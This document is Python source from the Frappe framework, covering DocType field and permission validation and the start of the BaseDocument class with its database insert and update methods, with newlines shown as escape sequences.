default\").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)\n\n\tdef check_width(d):\n\t\tif d.fieldtype == \"Currency\" and cint(d.width) < 100:\n\t\t\tfrappe.throw(_(\"Max width for type Currency is 100px in row {0}\").format(d.idx))\n\n\tdef check_in_list_view(d):\n\t\tif d.in_list_view and (d.fieldtype in not_allowed_in_list_view):\n\t\t\tfrappe.throw(_(\"'In List View' not allowed for type {0} in row {1}\").format(d.fieldtype, d.idx))\n\n\tdef check_in_global_search(d):\n\t\tif d.in_global_search and d.fieldtype in no_value_fields:\n\t\t\tfrappe.throw(_(\"'In Global Search' not allowed for type {0} in row {1}\")\n\t\t\t\t.format(d.fieldtype, d.idx))\n\n\tdef check_dynamic_link_options(d):\n\t\tif d.fieldtype==\"Dynamic Link\":\n\t\t\tdoctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))\n\t\t\tif not doctype_pointer or (doctype_pointer[0].fieldtype not in (\"Link\", \"Select\")) \\\n\t\t\t\tor (doctype_pointer[0].fieldtype==\"Link\" and doctype_pointer[0].options!=\"DocType\"):\n\t\t\t\tfrappe.throw(_(\"Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'\"))\n\n\tdef check_illegal_default(d):\n\t\tif d.fieldtype == \"Check\" and d.default and d.default not in ('0', '1'):\n\t\t\tfrappe.throw(_(\"Default for 'Check' type of field must be either '0' or '1'\"))\n\t\tif d.fieldtype == \"Select\" and d.default and (d.default not in d.options.split(\"\\n\")):\n\t\t\tfrappe.throw(_(\"Default for {0} must be an option\").format(d.fieldname))\n\n\tdef check_precision(d):\n\t\tif d.fieldtype in (\"Currency\", \"Float\", \"Percent\") and d.precision is not None and not (1 <= cint(d.precision) <= 6):\n\t\t\tfrappe.throw(_(\"Precision should be between 1 and 6\"))\n\n\tdef check_unique_and_text(docname, d):\n\t\tif meta.issingle:\n\t\t\td.unique = 0\n\t\t\td.search_index = 0\n\n\t\tif getattr(d, \"unique\", False):\n\t\t\tif d.fieldtype not in (\"Data\", \"Link\", \"Read Only\"):\n\t\t\t\tfrappe.throw(_(\"{0}: Fieldtype {1} for {2} cannot be unique\").format(docname, d.fieldtype, d.label), NonUniqueError)\n\n\t\t\tif not d.get(\"__islocal\"):\n\t\t\t\ttry:\n\t\t\t\t\thas_non_unique_values = frappe.db.sql(\"\"\"select `{fieldname}`, count(*)\n\t\t\t\t\t\tfrom `tab{doctype}` where ifnull({fieldname}, '') != ''\n\t\t\t\t\t\tgroup by `{fieldname}` having count(*) > 1 limit 1\"\"\".format(\n\t\t\t\t\t\tdoctype=d.parent, fieldname=d.fieldname))\n\n\t\t\t\texcept pymysql.InternalError as e:\n\t\t\t\t\tif e.args and e.args[0] == ER.BAD_FIELD_ERROR:\n\t\t\t\t\t\t# ignore if missing column, else raise\n\t\t\t\t\t\t# this happens in case of Custom Field\n\t\t\t\t\t\tpass\n\t\t\t\t\telse:\n\t\t\t\t\t\traise\n\n\t\t\t\telse:\n\t\t\t\t\t# else of try block\n\t\t\t\t\tif has_non_unique_values and has_non_unique_values[0][0]:\n\t\t\t\t\t\tfrappe.throw(_(\"{0}: Field '{1}' cannot be set as Unique as it has non-unique values\").format(docname, d.label), NonUniqueError)\n\n\t\tif d.search_index and d.fieldtype in (\"Text\", \"Long Text\", \"Small Text\", \"Code\", \"Text Editor\"):\n\t\t\tfrappe.throw(_(\"{0}:Fieldtype {1} for {2} cannot be indexed\").format(docname, d.fieldtype, d.label), CannotIndexedError)\n\n\tdef check_fold(fields):\n\t\tfold_exists = False\n\t\tfor i, f in enumerate(fields):\n\t\t\tif f.fieldtype==\"Fold\":\n\t\t\t\tif fold_exists:\n\t\t\t\t\tfrappe.throw(_(\"There can be only one Fold in a form\"))\n\t\t\t\tfold_exists = True\n\t\t\t\tif i < len(fields)-1:\n\t\t\t\t\tnxt = fields[i+1]\n\t\t\t\t\tif nxt.fieldtype != \"Section Break\":\n\t\t\t\t\t\tfrappe.throw(_(\"Fold must come before a Section Break\"))\n\t\t\t\telse:\n\t\t\t\t\tfrappe.throw(_(\"Fold can not be at the end of the form\"))\n\n\tdef check_search_fields(meta, fields):\n\t\t\"\"\"Throw exception if `search_fields` don't contain valid fields.\"\"\"\n\t\tif not meta.search_fields:\n\t\t\treturn\n\n\t\t# No value fields should not be included in search field\n\t\tsearch_fields = [field.strip() for field in (meta.search_fields or \"\").split(\",\")]\n\t\tfieldtype_mapper = { field.fieldname: field.fieldtype \\\n\t\t\tfor field in filter(lambda field: field.fieldname in search_fields, fields) }\n\n\t\tfor fieldname in search_fields:\n\t\t\tfieldname = fieldname.strip()\n\t\t\tif (fieldtype_mapper.get(fieldname) in no_value_fields) or \\\n\t\t\t\t(fieldname not in fieldname_list):\n\t\t\t\tfrappe.throw(_(\"Search field {0} is not valid\").format(fieldname))\n\n\tdef check_title_field(meta):\n\t\t\"\"\"Throw exception if `title_field` isn't a valid fieldname.\"\"\"\n\t\tif not meta.get(\"title_field\"):\n\t\t\treturn\n\n\t\tif meta.title_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Title field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdef _validate_title_field_pattern(pattern):\n\t\t\tif not pattern:\n\t\t\t\treturn\n\n\t\t\tfor fieldname in re.findall(\"{(.*?)}\", pattern, re.UNICODE):\n\t\t\t\tif fieldname.startswith(\"{\"):\n\t\t\t\t\t# edge case when double curlies are used for escape\n\t\t\t\t\tcontinue\n\n\t\t\t\tif fieldname not in fieldname_list:\n\t\t\t\t\tfrappe.throw(_(\"{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}.\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", filters={\"fieldname\": meta.title_field})[0]\n\t\tif df:\n\t\t\t_validate_title_field_pattern(df.options)\n\t\t\t_validate_title_field_pattern(df.default)\n\n\tdef check_image_field(meta):\n\t\t'''check image_field exists and is of type \"Attach Image\"'''\n\t\tif not meta.image_field:\n\t\t\treturn\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.image_field})\n\t\tif not df:\n\t\t\tfrappe.throw(_(\"Image field must be a valid fieldname\"), InvalidFieldNameError)\n\t\tif df[0].fieldtype != 'Attach Image':\n\t\t\tfrappe.throw(_(\"Image field must be of type Attach Image\"), InvalidFieldNameError)\n\n\tdef check_is_published_field(meta):\n\t\tif not meta.is_published_field:\n\t\t\treturn\n\n\t\tif meta.is_published_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Is Published Field must be a valid fieldname\"), InvalidFieldNameError)\n\n\tdef check_timeline_field(meta):\n\t\tif not meta.timeline_field:\n\t\t\treturn\n\n\t\tif meta.timeline_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Timeline field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.timeline_field})[0]\n\t\tif df.fieldtype not in (\"Link\", \"Dynamic Link\"):\n\t\t\tfrappe.throw(_(\"Timeline field must be a Link or Dynamic Link\"), InvalidFieldNameError)\n\n\tdef check_sort_field(meta):\n\t\t'''Validate that sort_field(s) is a valid field'''\n\t\tif meta.sort_field:\n\t\t\tsort_fields = [meta.sort_field]\n\t\t\tif ','  in meta.sort_field:\n\t\t\t\tsort_fields = [d.split()[0] for d in meta.sort_field.split(',')]\n\n\t\t\tfor fieldname in sort_fields:\n\t\t\t\tif not fieldname in fieldname_list + list(default_fields):\n\t\t\t\t\tfrappe.throw(_(\"Sort field {0} must be a valid fieldname\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\tdef check_illegal_depends_on_conditions(docfield):\n\t\t''' assignment operation should not be allowed in the depends on condition.'''\n\t\tdepends_on_fields = [\"depends_on\", \"collapsible_depends_on\"]\n\t\tfor field in depends_on_fields:\n\t\t\tdepends_on = docfield.get(field, None)\n\t\t\tif depends_on and (\"=\" in depends_on) and \\\n\t\t\t\tre.match(\"\"\"[\\w\\.:_]+\\s*={1}\\s*[\\w\\.@'\"]+\"\"\", depends_on):\n\t\t\t\tfrappe.throw(_(\"Invalid {0} condition\").format(frappe.unscrub(field)), frappe.ValidationError)\n\n\tdef scrub_options_in_select(field):\n\t\t\"\"\"Strip options for whitespaces\"\"\"\n\n\t\tif field.fieldtype == \"Select\" and field.options is not None:\n\t\t\toptions_list = []\n\t\t\tfor i, option in enumerate(field.options.split(\"\\n\")):\n\t\t\t\t_option = option.strip()\n\t\t\t\tif i==0 or _option:\n\t\t\t\t\toptions_list.append(_option)\n\t\t\tfield.options = '\\n'.join(options_list)\n\n\tdef scrub_fetch_from(field):\n\t\tif hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):\n\t\t\tfield.fetch_from = field.fetch_from.strip('\\n').strip()\n\n\tfields = meta.get(\"fields\")\n\tfieldname_list = [d.fieldname for d in fields]\n\n\tnot_allowed_in_list_view = list(copy.copy(no_value_fields))\n\tnot_allowed_in_list_view.append(\"Attach Image\")\n\tif meta.istable:\n\t\tnot_allowed_in_list_view.remove('Button')\n\n\tfor d in fields:\n\t\tif not d.permlevel: d.permlevel = 0\n\t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n\t\tif not d.fieldname:\n\t\t\td.fieldname = d.fieldname.lower()\n\n\t\tcheck_illegal_characters(d.fieldname)\n\t\tcheck_unique_fieldname(meta.get(\"name\"), d.fieldname)\n\t\tcheck_fieldname_length(d.fieldname)\n\t\tcheck_illegal_mandatory(meta.get(\"name\"), d)\n\t\tcheck_link_table_options(meta.get(\"name\"), d)\n\t\tcheck_dynamic_link_options(d)\n\t\tcheck_hidden_and_mandatory(meta.get(\"name\"), d)\n\t\tcheck_in_list_view(d)\n\t\tcheck_in_global_search(d)\n\t\tcheck_illegal_default(d)\n\t\tcheck_unique_and_text(meta.get(\"name\"), d)\n\t\tcheck_illegal_depends_on_conditions(d)\n\t\tscrub_options_in_select(d)\n\t\tscrub_fetch_from(d)\n\n\tcheck_fold(fields)\n\tcheck_search_fields(meta, fields)\n\tcheck_title_field(meta)\n\tcheck_timeline_field(meta)\n\tcheck_is_published_field(meta)\n\tcheck_sort_field(meta)\n\tcheck_image_field(meta)\n\ndef validate_permissions_for_doctype(doctype, for_remove=False):\n\t\"\"\"Validates if permissions are set correctly.\"\"\"\n\tdoctype = frappe.get_doc(\"DocType\", doctype)\n\tvalidate_permissions(doctype, for_remove)\n\n\t# save permissions\n\tfor perm in doctype.get(\"permissions\"):\n\t\tperm.db_update()\n\n\tclear_permissions_cache(doctype.name)\n\ndef clear_permissions_cache(doctype):\n\tfrappe.clear_cache(doctype=doctype)\n\tdelete_notification_count_for(doctype)\n\tfor user in frappe.db.sql_list(\"\"\"select\n\t\t\tdistinct `tabHas Role`.parent\n\t\tfrom\n\t\t\t`tabHas Role`,\n\t\ttabDocPerm\n\t\t\twhere tabDocPerm.parent = %s\n\t\t\tand tabDocPerm.role = `tabHas Role`.role\"\"\", doctype):\n\t\tfrappe.clear_cache(user=user)\n\ndef validate_permissions(doctype, for_remove=False):\n\tpermissions = doctype.get(\"permissions\")\n\tif not permissions:\n\t\tfrappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')\n\tissingle = issubmittable = isimportable = False\n\tif doctype:\n\t\tissingle = cint(doctype.issingle)\n\t\tissubmittable = cint(doctype.is_submittable)\n\t\tisimportable = cint(doctype.allow_import)\n\n\tdef get_txt(d):\n\t\treturn _(\"For {0} at level {1} in {2} in row {3}\").format(d.role, d.permlevel, d.parent, d.idx)\n\n\tdef check_atleast_one_set(d):\n\t\tif not d.read and not d.write and not d.submit and not d.cancel and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: No basic permissions set\").format(get_txt(d)))\n\n\tdef check_double(d):\n\t\thas_similar = False\n\t\tsimilar_because_of = \"\"\n\t\tfor p in permissions:\n\t\t\tif p.role==d.role and p.permlevel==d.permlevel and p!=d:\n\t\t\t\tif p.if_owner==d.if_owner:\n\t\t\t\t\tsimilar_because_of = _(\"If Owner\")\n\t\t\t\t\thas_similar = True\n\t\t\t\t\tbreak\n\n\t\tif has_similar:\n\t\t\tfrappe.throw(_(\"{0}: Only one rule allowed with the same Role, Level and {1}\")\\\n\t\t\t\t.format(get_txt(d),\tsimilar_because_of))\n\n\tdef check_level_zero_is_set(d):\n\t\tif cint(d.permlevel) > 0 and d.role != 'All':\n\t\t\thas_zero_perm = False\n\t\t\tfor p in permissions:\n\t\t\t\tif p.role==d.role and (p.permlevel or 0)==0 and p!=d:\n\t\t\t\t\thas_zero_perm = True\n\t\t\t\t\tbreak\n\n\t\t\tif not has_zero_perm:\n\t\t\t\tfrappe.throw(_(\"{0}: Permission at level 0 must be set before higher levels are set\").format(get_txt(d)))\n\n\t\t\tfor invalid in (\"create\", \"submit\", \"cancel\", \"amend\"):\n\t\t\t\tif d.get(invalid): d.set(invalid, 0)\n\n\tdef check_permission_dependency(d):\n\t\tif d.cancel and not d.submit:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Cancel without Submit\").format(get_txt(d)))\n\n\t\tif (d.submit or d.cancel or d.amend) and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Submit, Cancel, Amend without Write\").format(get_txt(d)))\n\t\tif d.amend and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Amend without Cancel\").format(get_txt(d)))\n\t\tif d.get(\"import\") and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Import without Create\").format(get_txt(d)))\n\n\tdef remove_rights_for_single(d):\n\t\tif not issingle:\n\t\t\treturn\n\n\t\tif d.report:\n\t\t\tfrappe.msgprint(_(\"Report cannot be set for Single types\"))\n\t\t\td.report = 0\n\t\t\td.set(\"import\", 0)\n\t\t\td.set(\"export\", 0)\n\n\t\tfor ptype, label in [[\"set_user_permissions\", _(\"Set User Permissions\")]]:\n\t\t\tif d.get(ptype):\n\t\t\t\td.set(ptype, 0)\n\t\t\t\tfrappe.msgprint(_(\"{0} cannot be set for Single types\").format(label))\n\n\tdef check_if_submittable(d):\n\t\tif d.submit and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Submit if not Submittable\").format(get_txt(d)))\n\t\telif d.amend and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Amend if not Submittable\").format(get_txt(d)))\n\n\tdef check_if_importable(d):\n\t\tif d.get(\"import\") and not isimportable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set import as {1} is not importable\").format(get_txt(d), doctype))\n\n\tfor d in permissions:\n\t\tif not d.permlevel:\n\t\t\td.permlevel=0\n\t\tcheck_atleast_one_set(d)\n\t\tif not for_remove:\n\t\t\tcheck_double(d)\n\t\t\tcheck_permission_dependency(d)\n\t\t\tcheck_if_submittable(d)\n\t\t\tcheck_if_importable(d)\n\t\tcheck_level_zero_is_set(d)\n\t\tremove_rights_for_single(d)\n\ndef make_module_and_roles(doc, perm_fieldname=\"permissions\"):\n\t\"\"\"Make `Module Def` and `Role` records if already not made. Called while installing.\"\"\"\n\ttry:\n\t\tif hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \\\n\t\t\tnot frappe.db.exists('Domain', doc.restrict_to_domain):\n\t\t\tfrappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()\n\n\t\tif not frappe.db.exists(\"Module Def\", doc.module):\n\t\t\tm = frappe.get_doc({\"doctype\": \"Module Def\", \"module_name\": doc.module})\n\t\t\tm.app_name = frappe.local.module_app[frappe.scrub(doc.module)]\n\t\t\tm.flags.ignore_mandatory = m.flags.ignore_permissions = True\n\t\t\tm.insert()\n\n\t\tdefault_roles = [\"Administrator\", \"Guest\", \"All\"]\n\t\troles = [p.role for p in doc.get(\"permissions\") or []] + default_roles\n\n\t\tfor role in list(set(roles)):\n\t\t\tif not frappe.db.exists(\"Role\", role):\n\t\t\t\tr = frappe.get_doc(dict(doctype= \"Role\", role_name=role, desk_access=1))\n\t\t\t\tr.flags.ignore_mandatory = r.flags.ignore_permissions = True\n\t\t\t\tr.insert()\n\texcept frappe.DoesNotExistError as e:\n\t\tpass\n\texcept frappe.SQLError as e:\n\t\tif e.args[0]==1146:\n\t\t\tpass\n\t\telse:\n\t\t\traise\n\ndef init_list(doctype):\n\t\"\"\"Make boilerplate list views.\"\"\"\n\tdoc = frappe.get_meta(doctype)\n\tmake_boilerplate(\"controller_list.js\", doc)\n\tmake_boilerplate(\"controller_list.html\", doc)\n\ndef check_if_fieldname_conflicts_with_methods(doctype, fieldname):\n\tdoc = frappe.get_doc({\"doctype\": doctype})\n\tmethod_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]\n\n\tif fieldname in method_list:\n\t\tfrappe.throw(_(\"Fieldname {0} conflicting with meta object\").format(fieldname))\n\ndef clear_linked_doctype_cache():\n\tfrappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')\n/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using 